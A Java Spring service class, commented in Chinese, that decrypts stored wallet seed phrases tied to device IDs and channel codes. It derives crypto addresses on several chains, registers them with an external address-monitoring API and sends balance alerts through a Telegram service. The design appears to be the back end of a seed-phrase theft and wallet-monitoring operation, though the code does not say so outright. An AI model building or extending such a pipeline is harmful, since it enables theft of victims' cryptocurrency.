package com.consumer.service;

import com.alibaba.fastjson.JSONObject;
import com.consumer.config.ConsumerProperties;
import com.consumer.dao.Address4Dao;
import com.consumer.dao.MnemonicDao;
import com.consumer.entity.Address4Entity;
import com.consumer.entity.MnemonicEntity;
import com.consumer.query.AddressApiQuery;
import com.consumer.util.MnemonicAesUtil;
import com.consumer.util.MonitorUtil;
import com.consumer.util.WalletAddressUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import javax.crypto.spec.SecretKeySpec;
import java.util.*;
import java.util.concurrent.Executor;
/**
 * news4:tasks 业务处理器。
 * <p>
 * 职责：消费 wallet_derive 消息 → 从 DB 查加密助记词 → AES-256 解密
 *       → 派生 BTC/ETH/TRX/SOL 钱包地址 → 写入 address4 表。
 * <p>
 * 独立于 war_unpack/nb_memorandum/parse_ci，单独的 Handler 类。
 */
@Service
@Slf4j
public class News4Handler {

    @Resource
    private ConsumerProperties consumerProps;
    @Resource
    private MnemonicDao mnemonicDao;
    @Resource
    private Address4Dao address4Dao;
    @Resource
    private MnemonicTelegramService mnemonicTelegramService;
    @Resource(name = "news4ListenExecutor")
    private Executor news4ListenExecutor;
    @Resource(name = "news4BalanceExecutor")
    private Executor news4BalanceExecutor;

    private volatile SecretKeySpec aesKey;

    @PostConstruct
    public void init() {
        try {
            this.aesKey = MnemonicAesUtil.resolveKey(consumerProps.getMnemonicAesKey());
            if (this.aesKey == null) {
                log.info("【news4】mnemonic-aes-key 未配置，mnemonic.result 按明文读取");
            }
        } catch (Exception e) {
            log.error("News4Handler initAesKey FAIL: {}", e.toString());
        }
    }

    /**
     * 处理一条 news4:tasks 消息。
     * 当前支持的 job：wallet_derive
     */
    public boolean handle(Map<String, String> fields) {
        String job = fields == null ? null : fields.get("job");
        if (job == null) {
            return true;
        }
        switch (job) {
            case "wallet_derive":
                return handleWalletDerive(fields);
            default:
                return true;
        }
    }

    /**
     * wallet_derive：从 DB 查助记词 → 解密 → 派生地址 → 写 address4。
     * <p>
     * 消息字段：mnemonic_id, device_id, phrase_hash, chains(tron,eth,bsc,btc,sol), address_idx
     */
    private boolean handleWalletDerive(Map<String, String> fields) {
        String mnemonicIdStr = fields.get("mnemonic_id");
        String source = nullToEmpty(fields.get("source"));
        String chainsStr = nullToEmpty(fields.get("chains"));
        if (chainsStr.isEmpty()) chainsStr = "tron,eth,bsc,btc,sol";

        if (mnemonicIdStr == null || mnemonicIdStr.isEmpty()) {
            log.warn("【news4】缺少 mnemonic_id，跳过");
            return true;
        }

        Integer mnemonicId = Integer.parseInt(mnemonicIdStr);
        MnemonicEntity mn = mnemonicDao.selectById(mnemonicId);
        if (mn == null) {
            log.warn("【news4】mnemonic 记录不存在 id={}，跳过", mnemonicId);
            return true;
        }

        // 幂等：status=2 表示已经派生完成，多实例/重试重复消费直接跳过
        if (mn.getStatus() != null && mn.getStatus() >= 2) {
            log.info("【news4】mnemonic 已派生完成，跳过 mnemonic_id={} status={}", mnemonicId, mn.getStatus());
            return true;
        }

        // 解密助记词
        String phrasePlain;
        try {
            phrasePlain = MnemonicAesUtil.decodeFromStorage(mn.getResult(), this.aesKey);
//            log.info("【news4】助记词解密成功 mnemonic_id={} source={} phrasePlain={}", mnemonicId,source,phrasePlain);
        } catch (Exception e) {
            log.error("【news4】助记词解密失败 mnemonic_id={} err={}", mnemonicId, e.toString());
            return false;
        }
        if (phrasePlain == null || phrasePlain.isEmpty()) {
            log.warn("【news4】助记词解密为空 mnemonic_id={}", mnemonicId);
            return false;
        }

        // 派生地址并写入 address4
        String[] chains = chainsStr.split(",");
        double now = System.currentTimeMillis() / 1000.0;
        int addrIdx = 0;
        try { addrIdx = Integer.parseInt(fields.getOrDefault("address_idx", "0")); } catch (Exception ignore) {}

        // 高并发优化：一次 PBKDF2 计算 seed，多链共享，避免每条链重复 2048 轮 HMAC-SHA512
        // 原 deriveByChain 每条链各跑一次 mnemonicToSeed（5 链 = 5 次 PBKDF2），此处降为 1 次
        java.util.Map<String, String> derived = WalletAddressUtil.deriveAllChains(chains, phrasePlain, addrIdx);

        // 批量收集成功写入的地址，后续统一异步通知外部 API
        List<Address4Entity> toInsert = new ArrayList<>(derived.size());
        // 按链分组收集成功地址，用于异步 HTTP 通知
        Map<String, List<String>> notifyMap = new HashMap<>();

        for (Map.Entry<String, String> entry : derived.entrySet()) {
            String chain = entry.getKey();
            String address = entry.getValue();

            JSONObject alg = new JSONObject();
            alg.put("type", "BIP39+BIP44");
            alg.put("chain", chain);
            alg.put("path", WalletAddressUtil.getDerivePath(chain, addrIdx));
            alg.put("addr_index", addrIdx);

            Address4Entity a = new Address4Entity();
            a.setMnemonicId(mnemonicId);
            a.setAddress(address);
            a.setChaintype(chain);
            a.setAddrindex(addrIdx);
            a.setStatus(1);
            a.setAlgorithm(alg.toJSONString());
            a.setNativeBal("0");
            a.setUsdtBal("0");
            a.setUsdcBal("0");
            a.setAddtime(now);
            a.setBalanceRefreshedAt(now);

            try {
                // upsert 幂等写入：高并发/重试场景下 (mnemonic_id, chaintype, addrindex) 唯一键冲突时更新而非抛错
                address4Dao.upsert(a);
                toInsert.add(a);
                notifyMap.computeIfAbsent(chain, k -> new ArrayList<>()).add(address);
            } catch (Exception e) {
                log.error("【news4】address4 upsert 失败 mnemonic_id={} chain={} err={}",
                        mnemonicId, chain, e.toString());
            }
        }

        // 旁路拆分：listen 与 balance 并行投递到独立线程池，互不堵塞，且不反压 n4-worker
        if (!toInsert.isEmpty()) {
            final Integer mid = mnemonicId;
            final String deviceId = nullToEmpty(fields.get("device_id"));
            final String channelCode = mn.getChannelcode();
            final List<Address4Entity> copied = new ArrayList<>(toInsert);
            final Map<String, List<String>> notifyCopied = new HashMap<>();
            for (Map.Entry<String, List<String>> e : notifyMap.entrySet()) {
                notifyCopied.put(e.getKey(), new ArrayList<>(e.getValue()));
            }

            news4ListenExecutor.execute(() -> {
                for (Map.Entry<String, List<String>> ne : notifyCopied.entrySet()) {
                    try {
                        AddressApiQuery query = new AddressApiQuery();
                        query.setChain(ne.getKey());
                        query.setAddresses(ne.getValue());
                        MonitorUtil.walletPost("/listen/addaddress", query);
                    } catch (Exception e) {
                        log.warn("【news4】外部API通知失败 chain={} err={}", ne.getKey(), e.toString());
                    }
                }
            });

            news4BalanceExecutor.execute(() -> {
                try {
                    mnemonicTelegramService.notifyBalanceAfterDeriveAsync(
                            mid, deviceId, channelCode, copied);
                } catch (Exception e) {
                    log.warn("【news4】余额/飞机通知提交失败 mnemonic_id={} err={}", mid, e.toString());
                }
            });
        }

        // 更新 mnemonic 状态为已派生（至少有一条成功才更新）
        if (!toInsert.isEmpty()) {
            try {
                mn.setStatus(2);
                mnemonicDao.updateById(mn);
            } catch (Exception e) {
                log.warn("【news4】mnemonic 状态更新失败 id={} err={}", mnemonicId, e.toString());
            }
        }

        return true;
    }

    // ==================== 工具方法 ====================

    private static String nullToEmpty(String s) {
        return s == null ? "" : s;
    }
}
